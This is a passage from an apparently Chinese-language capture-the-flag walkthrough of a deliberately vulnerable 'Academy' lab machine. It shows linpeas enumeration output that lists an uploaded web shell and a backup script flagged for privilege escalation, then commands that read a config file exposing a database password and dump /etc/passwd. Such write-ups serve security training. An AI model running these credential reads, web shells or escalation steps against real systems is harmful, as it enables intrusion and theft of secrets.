class="string">/var/lib/phpmyadmin/tmp/twig/97/9734627c3841f4edcd6c2b6f193947fc0a7a9a69dd1955f703f4f691af6b45e3.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/99</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/99/9937763182924ca59c5731a9e6a0d96c77ec0ca5ce3241eec146f7bca0a6a0dc.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/9d</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/9d/9d254bc0e43f46a8844b012d501626d3acdd42c4a2d2da29c2a5f973f04a04e8.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/9d/9d6c5c59ee895a239eeb5956af299ac0e5eb1a69f8db50be742ff0c61b618944.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/9e</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/9e/9ed23d78fa40b109fca7524500b40ca83ceec9a3ab64d7c38d780c2acf911588.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/a0</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/a0/a0c00a54b1bb321f799a5f4507a676b317067ae03b1d45bd13363a544ec066b7.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/a4</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/a4/a49a944225d69636e60c581e17aaceefffebe40aeb5931afd4aaa3da6a0039b9.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/a7</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/a7/a7e9ef3e1f57ef5a497ace07803123d1b50decbe0fcb448cc66573db89b48e25.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/ae</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/ae/ae25b735c0398c0c6a34895cf07f858207e235cf453cadf07a003940bfb9cd05.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/af</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/af/af668e5234a26d3e85e170b10e3d989c2c0c0679b2e5110d593a80b4f58c6443.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/af/af6dd1f6871b54f086eb95e1abc703a0e92824251df6a715be3d3628d2bd3143.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/af/afa81ff97d2424c5a13db6e43971cb716645566bd8d5c987da242dddf3f79817.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/b6</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/b6/b6c8adb0e14792534ce716cd3bf1d57bc78d45138e62be7d661d75a5f03edcba.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/c3</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/c3/c34484a1ece80a38a03398208a02a6c9c564d1fe62351a7d7832d163038d96f4.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/c5</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/c5/c50d1c67b497a887bc492962a09da599ee6c7283a90f7ea08084a548528db689.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/c7</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/c7/c70df99bff2eea2f20aba19bbb7b8d5de327cecaedb5dc3d383203f7d3d02ad2.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/ca</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/ca/ca32544b55a5ebda555ff3c0c89508d6e8e139ef05d8387a14389443c8e0fb49.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/d6</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/d6/d66c84e71db338af3aae5892c3b61f8d85d8bb63e2040876d5bbb84af484fb41.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/dd</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/dd/dd1476242f68168118c7ae6fc7223306d6024d66a38b3461e11a72d128eee8c1.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/e8</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/e8/e8184cd61a18c248ecc7e06a3f33b057e814c3c99a4dd56b7a7da715e1bc2af8.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/e9</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/e9/e93db45b0ff61ef08308b9a87b60a613c0a93fab9ee661c8271381a01e2fa57a.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/f5</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/f5/f589c1ad0b7292d669068908a26101f0ae7b5db110ba174ebc5492c80bc08508.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/fa</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/fa/fa249f377795e48c7d92167e29cef2fc31f50401a0bdbc95ddb51c0aec698b9e.php</span></span><br><span class="line"><span class="string">/var/tmp</span></span><br><span class="line"><span class="string">/var/www/html/academy</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/assets</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/assets/css</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/assets/css/bootstrap.css</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/assets/css/font-awesome.css</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/assets/css/style.css</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/assets/fonts</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/assets/fonts/FontAwesome.otf</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.eot</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.ttf</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/assets/fonts/fontawesome-webfont.woff2</span></span><br><span class="line"><span class="string">#)You_can_write_even_more_files_inside_last_directory</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/assets/img</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/assets/js</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/assets/js/bootstrap.js</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/assets/js/jquery-1.11.1.js</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/change-password.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/check_availability.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/course.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/department.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/edit-course.php</span></span><br><span class="line"><span class="string">#)You_can_write_even_more_files_inside_last_directory</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/includes/config.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/includes/footer.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/includes/header.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/includes/menubar.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/index.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/level.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/logout.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/manage-students.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/print.php</span></span><br><span class="line"><span class="string">#)You_can_write_even_more_files_inside_last_directory</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/var/www/html/academy/assets</span></span><br><span class="line"><span class="string">/var/www/html/academy/assets/css</span></span><br><span class="line"><span class="string">/var/www/html/academy/assets/css/bootstrap.css</span></span><br><span class="line"><span class="string">/var/www/html/academy/assets/css/font-awesome.css</span></span><br><span class="line"><span class="string">/var/www/html/academy/assets/css/style.css</span></span><br><span class="line"><span class="string">/var/www/html/academy/assets/fonts</span></span><br><span class="line"><span class="string">/var/www/html/academy/assets/fonts/FontAwesome.otf</span></span><br><span class="line"><span class="string">/var/www/html/academy/assets/fonts/fontawesome-webfont.eot</span></span><br><span class="line"><span class="string">/var/www/html/academy/assets/fonts/fontawesome-webfont.ttf</span></span><br><span class="line"><span class="string">/var/www/html/academy/assets/fonts/fontawesome-webfont.woff</span></span><br><span class="line"><span class="string">/var/www/html/academy/assets/fonts/fontawesome-webfont.woff2</span></span><br><span class="line"><span class="string">#)You_can_write_even_more_files_inside_last_directory</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/var/www/html/academy/assets/img</span></span><br><span class="line"><span class="string">/var/www/html/academy/assets/js</span></span><br><span class="line"><span class="string">/var/www/html/academy/assets/js/bootstrap.js</span></span><br><span class="line"><span class="string">/var/www/html/academy/assets/js/jquery-1.11.1.js</span></span><br><span class="line"><span class="string">/var/www/html/academy/change-password.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/check_availability.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/db</span></span><br><span class="line"><span class="string">/var/www/html/academy/db/onlinecourse.sql</span></span><br><span class="line"><span class="string">/var/www/html/academy/enroll-history.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/enroll.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/includes</span></span><br><span class="line"><span class="string">/var/www/html/academy/includes/config.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/includes/footer.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/includes/header.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/includes/menubar.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/index.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/logout.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/my-profile.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/pincode-verification.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/print.php</span></span><br><span class="line"><span class="string">#)You_can_write_even_more_files_inside_last_directory</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/var/www/html/academy/studentphoto/shell.php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                             </span></span><br><span class="line"><span class="string">  Group www-data:                                                                                                             </span></span><br><span class="line"><span class="string">/tmp/linpeas.sh                                                                                                               </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                            ╔═════════════════════════╗</span></span><br><span class="line"><span class="string">════════════════════════════╣ Other Interesting Files ╠════════════════════════════                                           </span></span><br><span class="line"><span class="string">                            ╚═════════════════════════╝                                                                       </span></span><br><span class="line"><span class="string">╔══════════╣ .sh files in path</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path                                    </span></span><br><span class="line"><span class="string">/usr/bin/gettext.sh                                                                                                           </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Executable files potentially added by user (limit 70)</span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Unexpected in /opt (usually empty)</span></span><br><span class="line"><span class="string">total 11332                                                                                                                   </span></span><br><span class="line"><span class="string">drwxr-xr-x  2 root root     4096 May 29  2021 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 18 root root     4096 May 29  2021 ..</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root root  1402271 Jun  3  2020 online-course-registration.zip</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root root 10190261 Oct 15  2020 phpMyAdmin-4.9.7-all-languages.tar.gz</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Unexpected in root</span></span><br><span class="line"><span class="string">/vmlinuz                                                                                                                      </span></span><br><span class="line"><span class="string">/initrd.img</span></span><br><span class="line"><span class="string">/initrd.img.old</span></span><br><span class="line"><span class="string">/vmlinuz.old</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Modified interesting files in the last 5mins (limit 100)</span></span><br><span class="line"><span class="string">/var/log/auth.log                                                                                                             </span></span><br><span class="line"><span class="string">/var/log/debug.1</span></span><br><span class="line"><span class="string">/var/log/daemon.log.1</span></span><br><span class="line"><span class="string">/var/log/daemon.log</span></span><br><span class="line"><span class="string">/var/log/syslog</span></span><br><span class="line"><span class="string">/var/log/messages.1</span></span><br><span class="line"><span class="string">/var/log/auth.log.1</span></span><br><span class="line"><span class="string">/var/log/syslog.1</span></span><br><span class="line"><span class="string">/var/log/kern.log.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Writable log files (logrotten) (limit 50)</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#logrotate-exploitation                                     </span></span><br><span class="line"><span class="string">logrotate 3.14.0                                                                                                              </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Default mail command:       /usr/bin/mail</span></span><br><span class="line"><span class="string">    Default compress command:   /bin/gzip</span></span><br><span class="line"><span class="string">    Default uncompress command: /bin/gunzip</span></span><br><span class="line"><span class="string">    Default compress extension: .gz</span></span><br><span class="line"><span class="string">    Default state file path:    /var/lib/logrotate/status</span></span><br><span class="line"><span class="string">    ACL support:                yes</span></span><br><span class="line"><span class="string">    SELinux support:            yes</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Files inside /home/www-data (limit 20)</span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Files inside others home (limit 20)</span></span><br><span class="line"><span class="string">/home/grimmie/.bash_history                                                                                                   </span></span><br><span class="line"><span class="string">/home/grimmie/.bashrc</span></span><br><span class="line"><span class="string">/home/grimmie/backup.sh</span></span><br><span class="line"><span class="string">/home/grimmie/.profile</span></span><br><span class="line"><span class="string">/home/grimmie/.bash_logout</span></span><br><span class="line"><span class="string">/var/www/html/index.html</span></span><br><span class="line"><span class="string">/var/www/html/academy/logout.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/enroll.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/check_availability.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/my-profile.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/change-password.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/print.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/studentphoto/licensed-image.jpeg</span></span><br><span class="line"><span class="string">/var/www/html/academy/studentphoto/shell.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/studentphoto/avatar-1.jpg.png</span></span><br><span class="line"><span class="string">/var/www/html/academy/studentphoto/noimage.png</span></span><br><span class="line"><span class="string">/var/www/html/academy/includes/footer.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/includes/header.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/includes/config.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/includes/menubar.php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Searching installed mail applications</span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Mails (limit 50)</span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Backup files (limited 100)</span></span><br><span class="line"><span class="string">-rwxr-xr-- 1 grimmie administrator 112 May 30  2021 /home/grimmie/backup.sh                                                   </span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 9716 Nov 28  2020 /usr/lib/modules/4.19.0-13-amd64/kernel/drivers/net/team/team_mode_activebackup.ko</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 9731 Mar 19  2021 /usr/lib/modules/4.19.0-16-amd64/kernel/drivers/net/team/team_mode_activebackup.ko</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 7867 Jul 16  1996 /usr/share/doc/telnet/README.old.gz</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 303 Oct 26  2018 /usr/share/doc/hdparm/changelog.old.gz</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 363752 Apr 30  2018 /usr/share/doc/manpages/Changes.old.gz</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 348 Nov 25  2020 /usr/share/man/man1/wsrep_sst_mariabackup.1.gz</span></span><br><span class="line"><span class="string">-rwxr-xr-x 1 root root 38412 Nov 25  2020 /usr/bin/wsrep_sst_mariabackup</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Web files?(output limit)</span></span><br><span class="line"><span class="string">/var/www/:                                                                                                                    </span></span><br><span class="line"><span class="string">total 12K</span></span><br><span class="line"><span class="string">drwxr-xr-x  3 root root 4.0K May 29  2021 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 12 root root 4.0K May 29  2021 ..</span></span><br><span class="line"><span class="string">drwxr-xr-x  3 root root 4.0K May 29  2021 html</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/var/www/html:</span></span><br><span class="line"><span class="string">total 24K</span></span><br><span class="line"><span class="string">drwxr-xr-x 3 root     root     4.0K May 29  2021 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 3 root     root     4.0K May 29  2021 ..</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 grimmie administrator 220 May 29  2021 /home/grimmie/.bash_logout                                                </span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 946 Oct 15  2020 /usr/share/phpmyadmin/vendor/pragmarx/google2fa/.scrutinizer.yml</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 799 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.php_cs.dist</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 224 Oct 15  2020 /usr/share/phpmyadmin/vendor/twig/twig/.editorconfig</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 0 Nov 15  2018 /usr/share/dictionaries-common/site-elisp/.nosearch</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 0 Feb 15 11:15 /run/network/.ifstate.lock</span></span><br><span class="line"><span class="string">-rw------- 1 root root 0 May 29  2021 /etc/.pwd.lock</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 220 Apr 18  2019 /etc/skel/.bash_logout</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)                                                                                                                       </span></span><br><span class="line"><span class="string">-rwxrwxrwx 1 www-data www-data 853290 Feb 15 14:03 /tmp/linpeas.sh                                                            </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Searching passwords in history files</span></span><br><span class="line"><span class="string">Binary file /usr/share/phpmyadmin/js/vendor/openlayers/theme/default/img/navigation_history.png matches                       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Searching passwords in config PHP files</span></span><br><span class="line"><span class="string">/usr/share/phpmyadmin/config.inc.php:$cfg[&#x27;</span>Servers<span class="string">&#x27;][$i][&#x27;</span>AllowNoPassword<span class="string">&#x27;] = false;                                          </span></span><br><span class="line"><span class="string">/usr/share/phpmyadmin/config.sample.inc.php:$cfg[&#x27;</span>Servers<span class="string">&#x27;][$i][&#x27;</span>AllowNoPassword<span class="string">&#x27;] = false;</span></span><br><span class="line"><span class="string">/usr/share/phpmyadmin/libraries/config.default.php:$cfg[&#x27;</span>Servers<span class="string">&#x27;][$i][&#x27;</span>AllowNoPassword<span class="string">&#x27;] = false;</span></span><br><span class="line"><span class="string">/usr/share/phpmyadmin/libraries/config.default.php:$cfg[&#x27;</span>ShowChgPassword<span class="string">&#x27;] = true;</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/includes/config.php:$mysql_password = &quot;My_V3ryS3cur3_P4ss&quot;;</span></span><br><span class="line"><span class="string">/var/www/html/academy/includes/config.php:$mysql_password = &quot;My_V3ryS3cur3_P4ss&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Searching *password* or *credential* files in home (limit 70)</span></span><br><span class="line"><span class="string">/etc/pam.d/common-password                                                                                                    </span></span><br><span class="line"><span class="string">/usr/bin/systemd-ask-password</span></span><br><span class="line"><span class="string">/usr/bin/systemd-tty-ask-password-agent</span></span><br><span class="line"><span class="string">/usr/lib/grub/i386-pc/legacy_password_test.mod</span></span><br><span class="line"><span class="string">/usr/lib/grub/i386-pc/password.mod</span></span><br><span class="line"><span class="string">/usr/lib/grub/i386-pc/password_pbkdf2.mod</span></span><br><span class="line"><span class="string">/usr/lib/systemd/system/multi-user.target.wants/systemd-ask-password-wall.path</span></span><br><span class="line"><span class="string">/usr/lib/systemd/system/sysinit.target.wants/systemd-ask-password-console.path</span></span><br><span class="line"><span class="string">/usr/lib/systemd/system/systemd-ask-password-console.path</span></span><br><span class="line"><span class="string">/usr/lib/systemd/system/systemd-ask-password-console.service</span></span><br><span class="line"><span class="string">/usr/lib/systemd/system/systemd-ask-password-wall.path</span></span><br><span class="line"><span class="string">/usr/lib/systemd/system/systemd-ask-password-wall.service</span></span><br><span class="line"><span class="string">  #)There are more creds/passwds files in the previous parent folder</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/usr/lib/x86_64-linux-gnu/mariadb19/plugin/mysql_clear_password.so</span></span><br><span class="line"><span class="string">/usr/lib/x86_64-linux-gnu/mariadb19/plugin/simple_password_check.so</span></span><br><span class="line"><span class="string">/usr/share/man/man1/systemd-ask-password.1.gz</span></span><br><span class="line"><span class="string">/usr/share/man/man1/systemd-tty-ask-password-agent.1.gz</span></span><br><span class="line"><span class="string">/usr/share/man/man7/credentials.7.gz</span></span><br><span class="line"><span class="string">/usr/share/man/man8/systemd-ask-password-console.path.8.gz</span></span><br><span class="line"><span class="string">/usr/share/man/man8/systemd-ask-password-console.service.8.gz</span></span><br><span class="line"><span class="string">/usr/share/man/man8/systemd-ask-password-wall.path.8.gz</span></span><br><span class="line"><span class="string">/usr/share/man/man8/systemd-ask-password-wall.service.8.gz</span></span><br><span class="line"><span class="string">  #)There are more creds/passwds files in the previous parent folder</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/usr/share/pam/common-password.md5sums</span></span><br><span class="line"><span class="string">/usr/share/phpmyadmin/user_password.php</span></span><br><span class="line"><span class="string">/var/cache/debconf/passwords.dat</span></span><br><span class="line"><span class="string">/var/lib/pam/password</span></span><br><span class="line"><span class="string">/var/www/html/academy/admin/change-password.php</span></span><br><span class="line"><span class="string">/var/www/html/academy/change-password.php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs</span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Searching passwords inside logs (limit 70)</span></span><br><span class="line"><span class="string">2021-05-29 17:00:10 install base-passwd:amd64 &lt;none&gt; 3.5.46                                                                   </span></span><br><span class="line"><span class="string">2021-05-29 17:00:10 status half-installed base-passwd:amd64 3.5.46</span></span><br><span class="line"><span class="string">2021-05-29 17:00:11 configure base-passwd:amd64 3.5.46 3.5.46</span></span><br><span class="line"><span class="string">2021-05-29 17:00:11 status half-configured base-passwd:amd64 3.5.46</span></span><br><span class="line"><span class="string">2021-05-29 17:00:11 status installed base-passwd:amd64 3.5.46</span></span><br><span class="line"><span class="string">2021-05-29 17:00:11 status unpacked base-passwd:amd64 3.5.46</span></span><br><span class="line"><span class="string">2021-05-29 17:00:18 status half-configured base-passwd:amd64 3.5.46</span></span><br><span class="line"><span class="string">2021-05-29 17:00:18 status half-installed base-passwd:amd64 3.5.46</span></span><br><span class="line"><span class="string">2021-05-29 17:00:18 status unpacked base-passwd:amd64 3.5.46</span></span><br><span class="line"><span class="string">2021-05-29 17:00:18 upgrade base-passwd:amd64 3.5.46 3.5.46</span></span><br><span class="line"><span class="string">2021-05-29 17:00:21 install passwd:amd64 &lt;none&gt; 1:4.5-1.1</span></span><br><span class="line"><span class="string">2021-05-29 17:00:21 status half-installed passwd:amd64 1:4.5-1.1</span></span><br><span class="line"><span class="string">2021-05-29 17:00:21 status unpacked passwd:amd64 1:4.5-1.1</span></span><br><span class="line"><span class="string">2021-05-29 17:00:24 configure base-passwd:amd64 3.5.46 &lt;none&gt;</span></span><br><span class="line"><span class="string">2021-05-29 17:00:24 status half-configured base-passwd:amd64 3.5.46</span></span><br><span class="line"><span class="string">2021-05-29 17:00:24 status installed base-passwd:amd64 3.5.46</span></span><br><span class="line"><span class="string">2021-05-29 17:00:24 status unpacked base-passwd:amd64 3.5.46</span></span><br><span class="line"><span class="string">2021-05-29 17:00:25 configure passwd:amd64 1:4.5-1.1 &lt;none&gt;</span></span><br><span class="line"><span class="string">2021-05-29 17:00:25 status half-configured passwd:amd64 1:4.5-1.1</span></span><br><span class="line"><span class="string">2021-05-29 17:00:25 status installed passwd:amd64 1:4.5-1.1</span></span><br><span class="line"><span class="string">2021-05-29 17:00:25 status unpacked passwd:amd64 1:4.5-1.1</span></span><br><span class="line"><span class="string">Description: Set up users and passwords</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                                ╔════════════════╗</span></span><br><span class="line"><span class="string">════════════════════════════════╣ API Keys Regex ╠════════════════════════════════                                            </span></span><br><span class="line"><span class="string">                                ╚════════════════╝                                                                            </span></span><br><span class="line"><span class="string">Regexes to search for API keys aren&#x27;</span>t activated, use param <span class="string">&#x27;-r&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>通過這工具也找出了不少關於這系統的資訊，及資料庫密碼，更重要的是<strong>backup.sh似乎可以進行PE利用</strong></p>
</li>
<li><p>查看**&#x2F;var&#x2F;www&#x2F;html&#x2F;academy&#x2F;includes&#x2F;config.php檔案內容**</p>
</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">$ <span class="built_in">cat</span> /var/www/html/academy/includes/config.php</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$mysql_hostname</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$mysql_user</span> = <span class="string">&quot;grimmie&quot;</span>;</span><br><span class="line"><span class="variable">$mysql_password</span> = <span class="string">&quot;My_V3ryS3cur3_P4ss&quot;</span>;</span><br><span class="line"><span class="variable">$mysql_database</span> = <span class="string">&quot;onlinecourse&quot;</span>;</span><br><span class="line"><span class="variable">$bd</span> = mysqli_connect(<span class="variable">$mysql_hostname</span>, <span class="variable">$mysql_user</span>, <span class="variable">$mysql_password</span>, <span class="variable">$mysql_database</span>) or die(<span class="string">&quot;Could not connect database&quot;</span>);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cat</span> /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:103:104:systemd 